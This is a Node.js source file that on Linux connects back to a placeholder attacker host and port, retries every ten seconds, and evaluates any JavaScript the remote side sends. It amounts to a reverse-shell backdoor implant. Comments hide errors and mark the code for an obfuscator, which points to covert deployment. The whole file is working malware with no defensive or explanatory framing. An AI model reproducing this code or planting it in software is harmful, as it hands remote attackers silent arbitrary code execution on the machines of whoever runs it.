const { exec } = require('child_process')

// TODO: Fix automatic reconnection

if (process.platform == 'linux') {

    function sleep(time) {
        return new Promise(res => setTimeout(res, time))
    }

    (() => {
        const PORT = '^socket_port^'
        const HOST = '^host_ip^'

        function decodeCommand(command) {
            const enc = new TextDecoder('utf-8')
            return enc.decode(command.slice(1))
        }

        // INITIALIZE SOCKET CONNECTION
        const net = require('net')

        const client = new net.Socket()
        let connected = false
        let killed = false
        let running = false
        client.on('error', () => { client.destroy(); connected = false; start() /* retry connection */ })
        client.on('close', () => { client.destroy(); connected = false; if (!killed) start() /* retry connection */ })
        const start = async () => {
            if (running) return
            running = true
            while (!connected) { // try to connect
                client.connect(PORT, HOST, () => {
                    connected = true
                    client.on('data', data => {
                        if (data[0] == 0x01) {
                            // DESTROY CONNECTION
                            client.write(new Uint8Array([true]))
                            killed = true
                            client.destroy()
                        } else if (data[0] == 0x02) {
                            // EXECUTE JS
                            try {
                                // javascript-obfuscator:disable
                                const _resF_ = (text) => client.write(text)
                                // javascript-obfuscator:enable
                                client.write(eval(decodeCommand(data)))
                            } catch (e) {
                                // do not log exceptions
                            }
                        }

                    })
                })
                await sleep(10000)
            }
            running = false
        }
        start()
    })()
}